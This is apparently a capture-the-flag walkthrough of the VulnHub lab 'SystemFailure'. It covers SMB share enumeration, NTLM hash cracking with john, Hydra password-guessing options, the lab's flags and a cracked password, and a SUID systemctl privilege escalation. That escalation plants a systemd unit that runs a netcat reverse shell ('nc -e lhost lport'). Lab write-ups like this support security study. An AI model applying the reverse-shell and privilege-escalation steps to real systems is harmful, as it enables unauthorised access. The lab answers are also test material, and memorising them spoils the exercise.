SystemFailure | [0xJin](https://twitter.com/0xJin)
=======================
**Source:** [vulnhub](https://www.vulnhub.com/entry/system-failure-1,654/)

Looting Information
-------------------

- as usual `nmap`
- smbenum by `enum4linux`

```sh
smbclient //SystemFailure/anonymous
Enter WORKGROUP\root's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Dec 17 21:25:14 2020
  ..                                  D        0  Wed Dec 16 14:58:53 2020
  share                               N      220  Thu Dec 17 21:25:14 2020

		7205476 blocks of size 1024. 5366092 blocks available
smb: \> mget *
Get file share? y
getting file \share of size 220 as share (43.0 KiloBytes/sec) (average 43.0 KiloBytes/sec)
smb: \> quit
```

`hint1`
cat `share`
-----------
<!-- 89492D216D0A212F8ED54FC5AC9D340B -->
```
Guys, I left you access only here to give you my shared file, you have little time, I leave you the login credentials inside for FTP you will find some info, you have to hurry!

NTLMHASH

Admin
```
Crack NTLM hash
---------------

cred for : ssh & ftp
<!-- admin:qazwsxedc -->
```sh
john --show --format=NT hash
admin: ...  
1 password hash cracked, 0 left
```

`hint2`
- /Syst3m/here.txt 
```
(I l3f7 y0u 0ur s3cr3t c0d3)+(I l3f7 17 ju57 f0r y0u)+(t0 m4k3)x(7h1ng5 s4f3r.)

-Admin
```
`hint3`

- Refer to `/home/admin/Syst3m/F4iluR3/file0189.txt` 

`...to create super-soldiers-J310MIYla1aVUaSV-`

`hint4`

```sh
admin@SystemFailure:/var/www/html/area4$ cat Sup3rS3cR37/System/note.txt 

Guys, I left something here for you, I know your skills well, we must try to hurry. Not always everything goes the right way.

-Admin
```
[useful.txt](http://systemfailure/area4/Sup3rS3cR37/System/useful.txt)


Adv. Information
----------------

- /home/jin/secret.txt
`Reminder: I had left something in /opt/system`


FLAG
----
<!-- 1871828204892bc09be79e1a02607dbf -->
- user.txt | /home/valex/ 

- user2.txt | /home/jin/
<!-- 172c7b08a7507f08bab7694fd632839e -->

- .superfinalflag.txt 

```sh
╔═╗┬ ┬┌─┐┌┬┐┌─┐┌┬┐  ╔═╗┌─┐┬┬  ┬ ┬┬─┐┌─┐
╚═╗└┬┘└─┐ │ ├┤ │││  ╠╣ ├─┤││  │ │├┬┘├┤ 
╚═╝ ┴ └─┘ ┴ └─┘┴ ┴  ╚  ┴ ┴┴┴─┘└─┘┴└─└─┘

I knew you would succeed.

Oh no.

2527f167fe33658f6b976f3a4ac988dd

Follow me and give feedback on Twitter: 0xJin

L1N5c3QzbUY0aUx1UjIzNTEyNA==
```

check this out: `L1N5c3QzbUY0aUx1UjIzNTEyNA==` > [/Syst3mF4iLuR235124](https://i.giphy.com/media/lp3GUtG2waC88/giphy.webp)


- root.txt `hint5` 
`If you are reading this flag, without being rooted, it is not valid. You must enter after send me a picture you entered jin, and tag me. Good luck.`

**use superpower to find**
```sh 
find / -iname "*.txt" 2> /dev/null
```


Ref Section
-----------

-e nsr
```
The -e flag gives you more options to test with. Sometimes users have passwords that are so amazingly bad that you have to account for them outside the normal scope of your wordlist. The letters nsr after the -e flag correspond to more ways to test. n stands for "null," meaning that Hydra will test for a user not having a password. s stands for "same." Hydra will test the same password as the username, when using s. r stands for "reverse." If a user thought that they were clever and reversed their bad password, Hydra will catch that too. 
```

SUID `systemctl` 
----------------

[GTFO](https://gtfobins.github.io/gtfobins/systemctl/)



`/tmp/reverse.service`
```sh
[Service]
Type=oneshot
ExecStart=/bin/sh /tmp/nc
[Install]
WantedBy=multi-user.target
```

`/tmp/nc`
```sh
nc -e lhost lport
```
```sh
systemctl link /tmp/reverse.service

# before that run listener from localhost

systemctl enable --now /tmp/reverse.service
```
